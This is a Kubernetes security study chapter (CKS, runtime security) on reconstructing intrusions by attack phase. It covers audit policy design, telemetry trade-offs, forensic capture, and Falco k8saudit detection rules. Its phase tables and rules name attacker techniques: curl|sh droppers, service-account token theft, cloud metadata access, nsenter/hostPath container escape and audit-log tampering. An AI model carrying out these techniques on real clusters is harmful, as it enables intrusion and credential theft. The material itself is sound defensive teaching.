# 6.3 Investigate and Identify Phases of Attack and Bad Actors Within the Environment

**CKS v1.34 — Domain 6: Monitoring, Logging and Runtime Security · Sub-topic weight: 4**

---

## 1. Motivation and the Production Architectural Problem

### 1.1 The asymmetry that makes Kubernetes intrusions hard to reconstruct

A classic Linux host gives an investigator one authoritative narrative: `/var/log/auth.log`, `auditd`, shell history, filesystem timestamps, and a stable hostname that maps to a physical asset. Kubernetes destroys every one of those assumptions:

| Traditional forensic anchor | What Kubernetes does to it |
|---|---|
| Stable hostname → asset | Pod names are ephemeral, regenerated on every ReplicaSet rollout |
| Long-lived disk to image | Container rootfs is an overlayfs that disappears on `CrashLoopBackOff` restart |
| `last`, `wtmp`, shell history | No shell, no PAM, no TTY in a distroless container; `kubectl exec` bypasses all of it |
| Static IP → identity | CNI IPAM recycles pod IPs in minutes; the same `10.244.3.17` can be three workloads in one hour |
| Local privilege model | Authorization happens in the API server, thousands of syscalls away from the host executing the work |
| Process tree from PID 1 | PID namespaces mean the host sees a different PID than the container does |

The consequence is architectural, not operational: **no single telemetry source can reconstruct an intrusion in Kubernetes.** The control plane knows *who asked* but not *what ran*. The kernel knows *what ran* but not *who authorized it*. The CNI knows *what talked to what* but neither identity nor intent. Investigation is fundamentally a **correlation problem across at least four independent planes**, joined on unstable keys (pod UID, container ID, node name, timestamp).

### 1.2 Dwell time is the metric that actually matters

The reason the CKS curriculum places this sub-topic in the runtime security domain is that prevention has a hard ceiling. Pod Security Admission, seccomp, AppArmor, image signing and NetworkPolicies raise the cost of intrusion; they do not make it zero. Once a workload with a legitimate, signed image is compromised through an application-layer flaw (deserialization bug, SSRF, dependency backdoor), every preventive control has already voted "allow". What remains is the **detect → investigate → contain** loop, and the only number that matters there is **dwell time**: the interval between initial access and the first defender action.

The architectural target for a production cluster:

```
Initial access ──► Detection signal        target ≤   60 s   (runtime sensor)
Detection      ──► Triage decision         target ≤  300 s   (correlated timeline)
Triage         ──► Containment             target ≤  600 s   (quarantine + evidence)
Containment    ──► Root cause              target ≤   24 h   (forensic artifacts)
```

Everything in this chapter exists to make those four numbers achievable, and each of them fails for a *different* architectural reason:

- Detection fails when the runtime sensor has no rule for the technique, or when the sensor is not on that node.
- Triage fails when audit logs are `Metadata`-only and you cannot see what object body an attacker submitted.
- Containment fails when your quarantine procedure destroys the evidence (deleting the pod).
- Root cause fails when the container rootfs was garbage collected before you captured it.

### 1.3 Modeling the adversary in phases, not in alerts

An alert is a point. An intrusion is a trajectory. If your investigation methodology is "look at the alert", you will contain a symptom and leave the actor resident. The industry-standard way to force trajectory-thinking is to map every observation onto a **kill-chain phase**, then ask: *what must have happened before this, and what will happen next?*

Three models are relevant, and a CKS candidate should know which one to reach for:

| Model | Granularity | Kubernetes fit | Best used for |
|---|---|---|---|
| **Lockheed Martin Cyber Kill Chain** (7 phases) | Coarse, perimeter-centric | Poor — assumes an outside-in intrusion, no notion of orchestrator | Executive narrative, tabletop exercises |
| **MITRE ATT&CK for Containers** (matrix `containers`) | Technique-level (Txxxx IDs) | Good — covers container runtime + orchestrator | Detection engineering, rule coverage gap analysis |
| **Microsoft Threat Matrix for Kubernetes** | Technique-level, K8s-native | Best — explicitly names kubeconfig theft, sidecar injection, CoreDNS poisoning, writable hostPath | Kubernetes-specific threat modeling and audit-policy design |

In practice you use ATT&CK as the taxonomy (because Falco, Tetragon and every SIEM tag rules with `TXXXX`) and the Microsoft matrix as the checklist for Kubernetes-specific coverage gaps.

### 1.4 The canonical Kubernetes attack path

Nearly every real Kubernetes compromise follows this skeleton. Memorize it — investigation is the act of finding the evidence for each hop, in order:

```
 ┌──────────────────────────────────────────────────────────────────────────┐
 │ 1. INITIAL ACCESS      Exploit a public-facing app (T1190)               │
 │                        └─► RCE inside container `app`                    │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 2. EXECUTION           Spawn a shell / download tooling (T1059)          │
 │                        └─► curl|sh, busybox, nc, base64-decoded dropper  │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 3. DISCOVERY           Read the environment (T1613, T1046, T1552.007)    │
 │                        └─► /var/run/secrets/.../token, env, 169.254.169.254│
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 4. CREDENTIAL ACCESS   Steal SA token / cloud IMDS creds (T1528, T1552)  │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 5. LATERAL MOVEMENT    Use token against kubernetes.default.svc          │
 │                        └─► list secrets, exec into other pods            │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 6. PRIVILEGE ESC.      Escape to host (T1611) or create privileged pod   │
 │                        └─► hostPID + nsenter, hostPath /, CAP_SYS_ADMIN  │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 7. PERSISTENCE         Static pod on node, CronJob, mutating webhook,    │
 │                        ClusterRoleBinding, implanted image (T1525)       │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 8. DEFENSE EVASION     Kill Falco, clear audit log, delete Events (T1562)│
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 9. IMPACT              Cryptomining, data exfil, resource hijack (T1496) │
 └──────────────────────────────────────────────────────────────────────────┘
```

Two properties of this path drive the whole detection architecture:

- **Phases 1–4 are invisible to the API server.** They happen entirely inside a container. Only a kernel-level runtime sensor sees them.
- **Phases 5–8 are largely invisible to the kernel sensor on the victim node.** They are API calls, seen only in the audit log — and possibly executed from a *different* node or from outside the cluster.

That is why the audit log and the runtime sensor are not alternatives. They are the two halves of one instrument.

---

## 2. Technical Comparatives and Trade-off Tables

### 2.1 The four telemetry planes

| Plane | Source | Sees | Cannot see | Latency | Volume (100-node prod) | Tamper resistance |
|---|---|---|---|---|---|---|
| **Control plane audit** | `kube-apiserver` audit backend | Every authenticated API request: identity, verb, resource, source IP, RBAC decision, optionally full request/response bodies | Anything not going through the API server: in-container execution, node-local commands, direct etcd or kubelet access | ~ms (log), ~s (webhook batch) | 2–20 GB/day at `Metadata`, 50–400 GB/day at `RequestResponse` | Medium — file on control-plane node, deletable by a root attacker; high if shipped off-cluster |
| **Runtime / syscall** | Falco, Tetragon, Tracee (eBPF or kmod) | `execve`, `open`, `connect`, `ptrace`, namespace changes, file writes, container escape primitives | Intent, authorization context, encrypted payload content | <1 s | 1–5 GB/day filtered; 100× that unfiltered | Medium — a root-on-host attacker can unload the probe (which is itself a detectable event) |
| **Network flow** | Cilium Hubble, CNI flow logs, service mesh telemetry | L3/L4 (and L7 with mesh/Hubble) flows with pod identity, DNS queries, policy verdicts | Payload of TLS, host-network traffic if the CNI is bypassed | <1 s | 5–50 GB/day | Medium |
| **Host OS** | `auditd`, journald, kubelet log, container runtime log | Node-level process/file/network activity including anything outside a container, kubelet API calls, image pulls | Kubernetes identity mapping without enrichment | ~s | 1–10 GB/day | Low locally, high if shipped |

**Architectural rule:** a detection strategy that covers fewer than three of these planes has a structural blind spot that an attacker can occupy indefinitely.

### 2.2 Audit policy: levels and stages

Audit level, per rule, decides how much of the event is recorded. This is the single biggest cost/visibility lever in the cluster.

| Level | Records | Bytes/event (typical) | Investigative value | Correct use |
|---|---|---|---|---|
| `None` | Nothing — event suppressed | 0 | — | High-volume noise: `get`/`watch` on `endpoints`, `leases`, `events`; healthz probes |
| `Metadata` | Who, when, what, from where, RBAC decision — no bodies | ~700 B | Answers "who touched what" | Default for all read verbs, and the floor for everything |
| `Request` | Metadata + request body | 2–20 KB | Shows exactly what the attacker *submitted* (the malicious pod spec) | `create`/`update`/`patch`/`delete` on workloads, RBAC, webhooks |
| `RequestResponse` | Metadata + request body + response body | 4–100 KB | Shows what the attacker *received* (the secret value, the token) | `secrets` (carefully), `pods/exec`, RBAC objects, `certificatesigningrequests` |

> **Trap:** `RequestResponse` on `secrets` writes the base64 secret material into the audit log. That converts your audit log into a credential store. The defensible default is `Metadata` on `secrets` — the *access* is the signal you need, not the value. Use `RequestResponse` on secrets only in a namespace-scoped rule with a hardened, off-cluster sink.

Stages control *when* an event is emitted:

| Stage | Emitted when | Why you care |
|---|---|---|
| `RequestReceived` | Immediately on receipt, before handling | Doubles log volume; almost always in `omitStages`. Its only value is detecting requests that crashed the API server |
| `ResponseStarted` | Response headers sent — long-running requests only (`watch`, `exec`, `portforward`) | **Critical.** A `kubectl exec` session that never terminates only ever produces this stage |
| `ResponseComplete` | Response finished | The workhorse stage; carries `responseStatus.code` |
| `Panic` | Handler panicked | Rare; potential exploitation of the API server itself |

> **Exam-relevant subtlety:** if you `omitStages: ["ResponseStarted"]` you will lose visibility on active `exec` and `port-forward` sessions that outlive the log window. Omit `RequestReceived`, never `ResponseStarted`.

### 2.3 Audit backends

| | `--audit-log-path` (log backend) | `--audit-webhook-config-file` (webhook backend) |
|---|---|---|
| Delivery | Append to a file on the control-plane node | HTTP POST of `EventList` to a remote endpoint |
| Failure mode | Disk full → API server **blocks/fails writes** (audit is on the request path) | Endpoint down → depends on mode; `batch` buffers then drops |
| Modes | n/a (blocking by construction) | `batch` (async, buffered), `blocking` (per-request wait), `blocking-strict` (also blocks at `RequestReceived`) |
| Latency added | µs | 0 in `batch`; full round-trip in `blocking` |
| Tamper resistance | Low — root on the node can `truncate audit.log` | High — data has already left the node |
| Ordering guarantee | Strict | Batched, may reorder |
| Ops burden | Log rotation, shipping agent, disk sizing | Endpoint HA, TLS, backpressure tuning |
| Typical production choice | Both: file for local forensics + `Fluent Bit`/`Vector` shipper, **or** file + webhook to Falco's `k8saudit` plugin | |

Key webhook tuning flags (`kube-apiserver`):

```
--audit-webhook-mode=batch
--audit-webhook-batch-max-size=400
--audit-webhook-batch-max-wait=30s
--audit-webhook-batch-throttle-qps=10
--audit-webhook-batch-throttle-burst=15
--audit-webhook-initial-backoff=10s
--audit-webhook-truncate-enabled=true
--audit-webhook-truncate-max-batch-size=10485760
--audit-webhook-truncate-max-event-size=102400
```

> **Availability trade-off to state explicitly in a design review:** `blocking-strict` means *if the audit sink is unavailable, the cluster stops accepting API requests*. That is the correct choice only where a regulator requires "no unlogged action". For everything else, `batch` plus a durable local file is the right answer.

### 2.4 Runtime sensor drivers (Falco)

| Driver | Mechanism | Kernel requirement | Perf overhead | Container-friendly | Notes |
|---|---|---|---|---|---|
| **Modern eBPF (CO-RE)** | eBPF, compile-once-run-everywhere | ≥ 5.8 with BTF | Lowest | Yes — no host build toolchain | **Default recommendation** for any recent distro |
| **eBPF probe (legacy)** | Pre-built `.o` fetched by `falcoctl` | ≥ 4.14 | Low | Yes | Fallback for pre-BTF kernels |
| **Kernel module** | Out-of-tree `falco.ko` | Matching kernel headers | Lowest raw, but in-kernel risk | No — requires DKMS/headers on host | Blocked by Secure Boot; a module panic takes the node down |
| **Userspace / plugin only** | No syscall source; plugins only (`k8saudit`, `cloudtrail`) | None | Negligible | Yes | The mode used for a Falco deployment that consumes **only** the Kubernetes audit stream |

### 2.5 Runtime detection tooling

| | **Falco** | **Tetragon** | **Tracee** | **auditd** |
|---|---|---|---|---|
| Project / governance | CNCF Graduated | CNCF (Cilium) | Aqua, CNCF Sandbox | Linux kernel userland |
| Sensor | kmod / eBPF | eBPF | eBPF | Kernel audit subsystem |
| Policy language | Falco rules YAML (`condition`, `output`, `priority`) | `TracingPolicy` CRD (kprobe/tracepoint/LSM) | Signatures (Rego/Go) + policy CRD | `auditctl` rules |
| **Enforcement (kill/block)** | No (detect-only; `falco-talon` as separate responder) | **Yes** — `SigKill`, `Override` actions in-kernel | Limited | No |
| K8s identity enrichment | Container runtime + `k8smeta` plugin | Native (Cilium identity) | Yes | None — needs external correlation |
| Audit-log ingestion | Yes — `k8saudit` plugin | No | No | No |
| ATT&CK tagging in shipped ruleset | Extensive (`mitre_*` tags) | Community policies | Signature metadata | None |
| Overhead at 5k syscalls/s | ~2–4 % CPU/node | ~1–3 % | ~2–5 % | 5–15 % (high, plus lock contention) |
| Best at | Broad, curated detection out of the box + audit correlation | Low-overhead process/file/network observability **with** in-kernel prevention | Deep signature research | Host-level compliance mandates |

**Practical stance for an SRE:** deploy Falco with the `k8saudit` plugin as the primary detection and correlation layer (it is the only one of the four that natively joins runtime and control-plane events), and add Tetragon where you need in-kernel enforcement or very high-cardinality process telemetry at minimal cost.

### 2.6 Attack phase → telemetry → artifact → response

This is the table to internalize. It is the investigation playbook in one page.

| Phase | ATT&CK | Primary plane | Concrete artifact to look for | First response |
|---|---|---|---|---|
| Initial Access | T1190 | App logs + network | Anomalous request in ingress log; first-ever egress from the pod | Snapshot pod, keep running |
| Execution | T1059 / T1609 | Runtime | `execve` of `sh`/`bash`/`curl`/`wget` in a container whose image has no such entrypoint | Falco alert → open incident |
| Discovery | T1613 / T1046 | Runtime + network | `open` of `/var/run/secrets/kubernetes.io/serviceaccount/token`; scan pattern to `10.96.0.0/12`; DNS query for `kubernetes.default.svc` | Correlate to audit log by pod UID |
| Credential Access | T1528 / T1552.007 | Runtime + network | Connect to `169.254.169.254`; read of `~/.kube/config`, `/var/lib/kubelet/pki/` | Rotate the SA token, revoke node cert |
| Lateral Movement | T1550 | **Audit** | API calls by `system:serviceaccount:*` with `userAgent` that is not the SDK, or with mismatched `authentication.kubernetes.io/pod-name` | Restrict RBAC, quarantine NetworkPolicy |
| Privilege Escalation | T1611 | Runtime | `setns`/`nsenter`, mount of `/proc/1/root`, write to `/var/lib/kubelet/...`, container with `hostPID`+`privileged` created | Cordon node, treat node as compromised |
| Persistence | T1543.005 / T1525 | Audit + runtime | `create` of `ClusterRoleBinding`, `MutatingWebhookConfiguration`, `CronJob`; file write into `/etc/kubernetes/manifests/` | Delete artifact **after** capture; hunt for siblings |
| Defense Evasion | T1562.001 / T1070 | Runtime + audit gaps | Falco process killed; `deletecollection` on `events`; truncation of `audit.log` (gap in `auditID` continuity) | Assume root-on-node; escalate |
| Impact | T1496 / T1485 | Runtime + network + metrics | Sustained 100 % CPU, connections to mining pool ports (3333/4444/14444), mass `delete` verbs | Full containment |

### 2.7 Forensic capture options

| Method | Fidelity | Disruption to attacker | Preserves memory | Effort | When to use |
|---|---|---|---|---|---|
| `kubectl logs --previous` | Low | None | No | Trivial | Always, first — logs die with the pod |
| `kubectl cp` from the pod | Medium | Low (writes into the container) | No | Low | Only if the container has `tar` |
| **Ephemeral container** (`kubectl debug`) | Medium-high | Low, but visible to a watching attacker | Process list yes, RAM no | Low | Live triage of a running compromised pod |
| **CRI checkpoint** (`/checkpoint` kubelet API) | **Highest** — full container state incl. memory | **None** — container keeps running | **Yes** | Medium | The right answer for production forensics |
| Node disk/EBS snapshot | High for disk | None | No | Medium | Host-level compromise |
| Node memory dump (LiME/AVML) | Highest for host | None | Yes (host) | High | Suspected kernel-level implant |
| Delete the pod | **Destroys evidence** | Total | No | — | **Never as a first action** |

---

## 3. Complete Manifests and Infrastructure

### 3.1 Production audit policy

`/etc/kubernetes/audit/audit-policy.yaml` — a complete, ordered policy. **Rules are evaluated top-to-bottom and the first match wins**, so noise suppression must come before broad capture, and high-value capture must come before both.

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy

# RequestReceived doubles volume with near-zero investigative value.
# ResponseStarted is deliberately NOT omitted: long-running exec/attach/
# port-forward sessions emit ONLY that stage until they terminate.
omitStages:
  - "RequestReceived"

# Never write managedFields into the audit log; it is pure noise.
omitManagedFields: true

rules:
  # ---------------------------------------------------------------------
  # SECTION A — HIGH VALUE. Full bodies. Must be first.
  # ---------------------------------------------------------------------

  # A1. Interactive access to a workload. The single strongest lateral-
  #     movement and hands-on-keyboard signal in the whole cluster.
  - level: RequestResponse
    verbs: ["create", "get"]
    resources:
      - group: ""
        resources:
          - "pods/exec"
          - "pods/attach"
          - "pods/portforward"
          - "pods/ephemeralcontainers"
          - "nodes/proxy"
          - "services/proxy"
          - "pods/proxy"

  # A2. Authorization changes = persistence and privilege escalation.
  - level: RequestResponse
    verbs: ["create", "update", "patch", "delete", "deletecollection"]
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]

  # A3. Admission control tampering — a mutating webhook is a cluster-wide
  #     implant that survives every pod restart.
  - level: RequestResponse
    resources:
      - group: "admissionregistration.k8s.io"
        resources: ["validatingwebhookconfigurations", "mutatingwebhookconfigurations",
                    "validatingadmissionpolicies", "validatingadmissionpolicybindings"]

  # A4. Certificate issuance — a signed CSR is a durable identity.
  - level: RequestResponse
    resources:
      - group: "certificates.k8s.io"
        resources: ["certificatesigningrequests", "certificatesigningrequests/approval",
                    "certificatesigningrequests/status"]

  # A5. Workload creation: we must be able to read the submitted PodSpec to
  #     prove whether it was privileged, hostPath-mounted or hostPID.
  - level: Request
    verbs: ["create", "update", "patch", "delete"]
    resources:
      - group: ""
        resources: ["pods", "serviceaccounts", "namespaces", "persistentvolumes"]
      - group: "apps"
        resources: ["deployments", "daemonsets", "statefulsets", "replicasets"]
      - group: "batch"
        resources: ["jobs", "cronjobs"]
      - group: "policy"
        resources: ["poddisruptionbudgets"]
      - group: "networking.k8s.io"
        resources: ["networkpolicies", "ingresses"]

  # A6. Anything an anonymous or unauthenticated principal manages to do.
  - level: RequestResponse
    userGroups: ["system:unauthenticated"]

  # ---------------------------------------------------------------------
  # SECTION B — SECRET MATERIAL. Metadata only, on purpose.
  # ---------------------------------------------------------------------

  # B1. WHO read WHICH secret is the signal. The VALUE must never be written
  #     to the audit log — that would turn the log into a credential store.
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]
      - group: ""
        resources: ["serviceaccounts/token"]

  # ---------------------------------------------------------------------
  # SECTION C — NOISE SUPPRESSION. Scoped as narrowly as possible.
  # ---------------------------------------------------------------------

  # C1. Control-plane controllers reading their own coordination objects.
  #     NOTE: this is intentionally limited to get/list/watch. A WRITE by
  #     these identities still falls through to Section D.
  - level: None
    verbs: ["get", "list", "watch"]
    users:
      - "system:kube-controller-manager"
      - "system:kube-scheduler"
      - "system:serviceaccount:kube-system:endpoint-controller"
      - "system:serviceaccount:kube-system:endpointslice-controller"
    resources:
      - group: ""
        resources: ["endpoints", "events", "configmaps"]
      - group: "coordination.k8s.io"
        resources: ["leases"]
      - group: "discovery.k8s.io"
        resources: ["endpointslices"]

  # C2. Kubelet status heartbeats.
  - level: None
    userGroups: ["system:nodes"]
    verbs: ["get", "list", "watch"]
    resources:
      - group: ""
        resources: ["nodes", "nodes/status", "pods", "pods/status"]
      - group: "coordination.k8s.io"
        resources: ["leases"]

  # C3. Unauthenticated health endpoints.
  - level: None
    nonResourceURLs:
      - "/healthz*"
      - "/readyz*"
      - "/livez*"
      - "/version"
      - "/metrics"

  # C4. API discovery.
  - level: None
    nonResourceURLs:
      - "/api*"
      - "/openapi*"
      - "/apis*"

  # ---------------------------------------------------------------------
  # SECTION D — CATCH-ALL. Nothing escapes unlogged.
  # ---------------------------------------------------------------------

  # D1. Every write anywhere gets its body captured.
  - level: Request
    verbs: ["create", "update", "patch", "delete", "deletecollection"]

  # D2. Everything else — every read, every subresource, every group.
  - level: Metadata
```

### 3.2 kube-apiserver static pod wired for auditing

`/etc/kubernetes/manifests/kube-apiserver.yaml` — the four blocks that must all be consistent. Missing any one of them puts the API server into `CrashLoopBackOff`, which on a single-control-plane cluster means a total outage.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
  namespace: kube-system
  labels:
    component: kube-apiserver
    tier: control-plane
  annotations:
    kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint: 10.0.0.10:6443
spec:
  hostNetwork: true
  priorityClassName: system-node-critical
  containers:
    - name: kube-apiserver
      image: registry.k8s.io/kube-apiserver:v1.34.0
      command:
        - kube-apiserver
        - --advertise-address=10.0.0.10
        - --allow-privileged=true
        - --authorization-mode=Node,RBAC
        - --client-ca-file=/etc/kubernetes/pki/ca.crt
        - --enable-admission-plugins=NodeRestriction
        - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
        - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
        - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
        - --etcd-servers=https://127.0.0.1:2379
        - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt
        - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key
        - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname
        - --secure-port=6443
        - --service-account-issuer=https://kubernetes.default.svc.cluster.local
        - --service-account-key-file=/etc/kubernetes/pki/sa.pub
        - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key
        - --service-cluster-ip-range=10.96.0.0/12
        - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
        - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
        # ---- BLOCK 1: audit configuration -------------------------------
        - --audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml
        - --audit-log-path=/var/log/kubernetes/audit/audit.log
        - --audit-log-format=json
        - --audit-log-maxage=30          # days to retain
        - --audit-log-maxbackup=10       # rotated files kept
        - --audit-log-maxsize=500        # MB before rotation
        - --audit-log-compress=true
        # ---- optional: stream to Falco k8saudit / SIEM -------------------
        - --audit-webhook-config-file=/etc/kubernetes/audit/webhook-kubeconfig.yaml
        - --audit-webhook-mode=batch
        - --audit-webhook-batch-max-size=400
        - --audit-webhook-batch-max-wait=15s
        - --audit-webhook-initial-backoff=10s
        - --audit-webhook-truncate-enabled=true
        - --audit-webhook-truncate-max-event-size=102400
      livenessProbe:
        failureThreshold: 8
        httpGet:
          host: 10.0.0.10
          path: /livez
          port: 6443
          scheme: HTTPS
        initialDelaySeconds: 10
        periodSeconds: 10
        timeoutSeconds: 15
      resources:
        requests:
          cpu: 250m
      volumeMounts:
        - name: ca-certs
          mountPath: /etc/ssl/certs
          readOnly: true
        - name: k8s-certs
          mountPath: /etc/kubernetes/pki
          readOnly: true
        # ---- BLOCK 2: policy mounted READ-ONLY --------------------------
        - name: audit-policy
          mountPath: /etc/kubernetes/audit
          readOnly: true
        # ---- BLOCK 3: log directory mounted READ-WRITE ------------------
        - name: audit-logs
          mountPath: /var/log/kubernetes/audit
          readOnly: false
  volumes:
    - name: ca-certs
      hostPath:
        path: /etc/ssl/certs
        type: DirectoryOrCreate
    - name: k8s-certs
      hostPath:
        path: /etc/kubernetes/pki
        type: DirectoryOrCreate
    # ---- BLOCK 4: hostPath sources ------------------------------------
    - name: audit-policy
      hostPath:
        path: /etc/kubernetes/audit
        type: DirectoryOrCreate
    - name: audit-logs
      hostPath:
        path: /var/log/kubernetes/audit
        type: DirectoryOrCreate
```

Webhook kubeconfig (`/etc/kubernetes/audit/webhook-kubeconfig.yaml`) — note this uses the *kubeconfig* schema, with `clusters[].cluster.server` pointing at the sink:

```yaml
apiVersion: v1
kind: Config
clusters:
  - name: falco-k8saudit
    cluster:
      server: http://127.0.0.1:9765/k8s-audit
contexts:
  - name: falco-k8saudit
    context:
      cluster: falco-k8saudit
      user: ""
current-context: falco-k8saudit
users: []
preferences: {}
```

> **Operational warning:** the API server dials this endpoint from the **host network namespace of the control-plane node**. `127.0.0.1:9765` therefore only works if Falco runs as a `hostNetwork: true` DaemonSet that is scheduled onto control-plane nodes (i.e. it tolerates `node-role.kubernetes.io/control-plane:NoSchedule`). Pointing it at a `ClusterIP` Service creates a bootstrap dependency: the API server needs the network to log, and the network needs the API server.

### 3.3 Falco DaemonSet with the k8saudit plugin (audit-stream consumer)

This deployment consumes **only** the audit webhook — no syscall driver. It is the correlation engine for phases 5–8.

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: falco
  labels:
    pod-security.kubernetes.io/enforce: privileged
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-k8saudit-config
  namespace: falco
data:
  falco.yaml: |
    # No syscall source in this deployment; plugins only.
    load_plugins: [k8saudit, json]

    plugins:
      - name: k8saudit
        library_path: libk8saudit.so
        init_config:
          maxEventSize: 262144
          webhookMaxBatchSize: 12582912
        open_params: "http://:9765/k8s-audit"
      - name: json
        library_path: libjson.so
        init_config: ""

    rules_files:
      - /etc/falco/k8s_audit_rules.yaml
      - /etc/falco/rules.d

    watch_config_files: true
    priority: notice
    buffered_outputs: false

    json_output: true
    json_include_output_property: true
    json_include_tags_property: true

    stdout_output:
      enabled: true

    http_output:
      enabled: true
      url: "http://falcosidekick.falco.svc.cluster.local:2801/"
      user_agent: "falcosecurity/falco"

    log_level: info
    log_stderr: true
    log_syslog: false

    metrics:
      enabled: true
      interval: 1h
      output_rule: true
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-audit-rules
  namespace: falco
data:
  audit-phases.yaml: |
    - required_engine_version: 0.31.0
    - required_plugin_versions:
        - name: k8saudit
          version: 0.7.0

    # ---- Reusable macros -------------------------------------------------
    - macro: kevt
      condition: (jevt.value[/stage] in ("ResponseComplete","ResponseStarted"))

    - macro: allowed
      condition: (jevt.value[/annotations/authorization.k8s.io~1decision] = "allow")

    - macro: kcreate
      condition: (ka.verb = create)

    - macro: kmodify
      condition: (ka.verb in (create, update, patch))

    - macro: service_account_user
      condition: (ka.user.name startswith "system:serviceaccount:")

    - list: trusted_exec_users
      items: ["system:serviceaccount:kube-system:generic-garbage-collector"]

    # ---- PHASE 5: LATERAL MOVEMENT --------------------------------------
    - rule: K8s Exec By ServiceAccount
      desc: >
        A ServiceAccount (not a human) opened an interactive session into a
        pod. Automation practically never needs exec; this is the strongest
        single indicator of a stolen in-cluster token being used for lateral
        movement.
      condition: >
        kevt and ka.target.subresource in (exec, attach) and allowed
        and service_account_user
        and not ka.user.name in (trusted_exec_users)
      output: >
        Interactive exec by ServiceAccount
        (user=%ka.user.name verb=%ka.verb target=%ka.target.namespace/%ka.target.name
         subresource=%ka.target.subresource cmd=%ka.uri.param[command]
         srcip=%ka.sourceips uri=%ka.uri userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_lateral_movement, T1609]

    # ---- PHASE 6: PRIVILEGE ESCALATION ----------------------------------
    - rule: K8s Privileged Pod Created
      desc: >
        A pod requesting privileged mode, hostPID, hostNetwork or a hostPath
        mount of a sensitive host directory was admitted. Any of these is a
        one-step container escape primitive.
      condition: >
        kevt and ka.target.resource = pods and kcreate and allowed
        and (ka.req.pod.containers.privileged intersects (true)
             or ka.req.pod.host_pid = true
             or ka.req.pod.host_ipc = true
             or ka.req.pod.host_network = true
             or ka.req.pod.volumes.hostpath intersects
                ("/", "/proc", "/var/run/docker.sock", "/var/run/crio/crio.sock",
                 "/run/containerd/containerd.sock", "/etc/kubernetes",
                 "/var/lib/kubelet", "/etc"))
      output: >
        Escape-capable pod admitted
        (user=%ka.user.name pod=%ka.target.namespace/%ka.target.name
         images=%ka.req.pod.containers.image privileged=%ka.req.pod.containers.privileged
         hostpid=%ka.req.pod.host_pid hostnet=%ka.req.pod.host_network
         hostpaths=%ka.req.pod.volumes.hostpath srcip=%ka.sourceips)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_privilege_escalation, T1611]

    # ---- PHASE 7: PERSISTENCE -------------------------------------------
    - rule: K8s ClusterRoleBinding To Cluster Admin
      desc: >
        A binding was created that grants cluster-admin. This is the standard
        persistence step after a token with RBAC write permission is stolen.
      condition: >
        kevt and ka.target.resource = clusterrolebindings and kmodify and allowed
        and ka.req.binding.role = cluster-admin
      output: >
        cluster-admin granted
        (user=%ka.user.name binding=%ka.target.name role=%ka.req.binding.role
         subject=%ka.req.binding.subjects srcip=%ka.sourceips userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_persistence, T1098]

    - rule: K8s Admission Webhook Modified
      desc: >
        A mutating or validating webhook configuration changed. A malicious
        mutating webhook silently injects sidecars or credentials into every
        future pod, cluster-wide, and survives all pod restarts.
      condition: >
        kevt and ka.target.resource in (mutatingwebhookconfigurations,
                                        validatingwebhookconfigurations)
        and kmodify and allowed
      output: >
        Admission webhook configuration changed
        (user=%ka.user.name resource=%ka.target.resource name=%ka.target.name
         verb=%ka.verb srcip=%ka.sourceips userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_persistence, T1554]

    # ---- PHASE 3/4: DISCOVERY AND CREDENTIAL ACCESS ---------------------
    - rule: K8s Secret Enumeration Cluster Wide
      desc: >
        A principal listed secrets across all namespaces. Legitimate workloads
        read one secret by name; cluster-wide enumeration is a credential
        harvesting pattern.
      condition: >
        kevt and ka.target.resource = secrets
        and ka.verb in (list, watch)
        and ka.target.namespace = ""
        and allowed
        and service_account_user
      output: >
        Cluster-wide secret enumeration
        (user=%ka.user.name verb=%ka.verb uri=%ka.uri srcip=%ka.sourceips
         userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_credential_access, T1552.007]

    - rule: K8s Anonymous Request Allowed
      desc: An unauthenticated principal was allowed to perform an action.
      condition: >
        kevt and allowed
        and ka.user.name in ("system:anonymous", "system:unauthenticated")
      output: >
        Anonymous request allowed
        (verb=%ka.verb uri=%ka.uri resource=%ka.target.resource
         ns=%ka.target.namespace srcip=%ka.sourceips userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_initial_access, T1078]

    # ---- PHASE 8: DEFENSE EVASION ---------------------------------------
    - rule: K8s Audit Trail Destruction
      desc: >
        Bulk deletion of Events, or deletion of a namespace holding security
        tooling. Classic anti-forensics.
      condition: >
        kevt and allowed
        and ((ka.verb = deletecollection and ka.target.resource = events)
             or (ka.verb = delete and ka.target.resource = namespaces
                 and ka.target.name in ("falco", "kube-system", "monitoring")))
      output: >
        Possible anti-forensics activity
        (user=%ka.user.name verb=%ka.verb resource=%ka.target.resource
         target=%ka.target.namespace/%ka.target.name srcip=%ka.sourceips)
      priority: CRITICAL
      source: k8s_audit
